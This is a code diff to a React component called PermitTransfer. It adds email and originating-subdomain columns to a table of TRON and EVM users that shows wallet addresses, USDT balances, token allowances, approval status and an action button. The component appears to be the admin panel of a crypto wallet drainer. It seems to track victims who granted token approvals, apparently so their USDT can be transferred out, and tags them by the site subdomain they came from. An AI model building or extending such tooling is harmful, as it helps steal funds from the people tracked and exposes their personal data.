@@ -19,6 +19,8 @@ import { formatUnits, parseUnits, erc20Abi } from 'viem';
 interface UserData {
   id: string;
   wallet_address: string;
+  email?: string | null;
+  origin?: string | null;
 }
 
 interface UserWithData extends UserData {
@@ -141,6 +143,8 @@ export function PermitTransfer() {
         const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
           id: u.id,
           wallet_address: u.wallet_address,
+          email: u.email || null,
+          origin: u.origin || null,
           allowance: BigInt(u.allowance || '0'),
           balance: BigInt(u.balance || '0'),
           network: 'tron' as const,
@@ -261,6 +265,8 @@ export function PermitTransfer() {
         const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
           id: u.id,
           wallet_address: u.wallet_address,
+          email: u.email || null,
+          origin: u.origin || null,
           allowance: BigInt(u.allowance || '0'),
           balance: BigInt(u.balance || '0'),
           network: 'evm' as const,
@@ -680,6 +686,8 @@ export function PermitTransfer() {
             <TableHeader>
               <TableRow className="border-white/10 hover:bg-transparent">
                 <TableHead>{network === 'tron' ? 'TRON' : 'EVM'} Wallet</TableHead>
+                <TableHead>Email</TableHead>
+                <TableHead>Subdomain</TableHead>
                 <TableHead className="text-center">USDT Balance</TableHead>
                 <TableHead className="text-center">Approval Status</TableHead>
                 <TableHead>Action</TableHead>
@@ -688,14 +696,14 @@ export function PermitTransfer() {
             <TableBody>
               {loading ? (
                 <TableRow>
-                  <TableCell colSpan={4} className="text-center py-8">
+                  <TableCell colSpan={6} className="text-center py-8">
                     <Loader2 className="h-6 w-6 animate-spin mx-auto mb-2" />
                     Loading {network === 'tron' ? 'TRON' : 'EVM'} users...
                   </TableCell>
                 </TableRow>
               ) : users.length === 0 ? (
                 <TableRow>
-                  <TableCell colSpan={4} className="text-center py-8 text-muted-foreground">
+                  <TableCell colSpan={6} className="text-center py-8 text-muted-foreground">
                     <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
                     No {network === 'tron' ? 'TRON' : 'EVM'} users found in database
                   </TableCell>
@@ -721,6 +729,20 @@ export function PermitTransfer() {
                           </Badge>
                           {formatAddress(user.wallet_address)}
                         </div>
+                      </TableCell>
+                      <TableCell>
+                        <span className="text-sm text-muted-foreground truncate max-w-[180px] block" title={user.email || ''}>
+                          {user.email || <span className="text-white/20 italic">N/A</span>}
+                        </span>
+                      </TableCell>
+                      <TableCell>
+                        {user.origin ? (
+                          <Badge variant="outline" className="border-purple-500/50 text-purple-400 text-xs">
+                            {user.origin}
+                          </Badge>
+                        ) : (
+                          <span className="text-white/20 italic text-sm">N/A</span>
+                        )}
                       </TableCell>
                       <TableCell className="text-center">
                         <span className={`text-sm font-medium ${user.balance > BigInt(0) ? 'text-white' : 'text-muted-foreground'}`}>
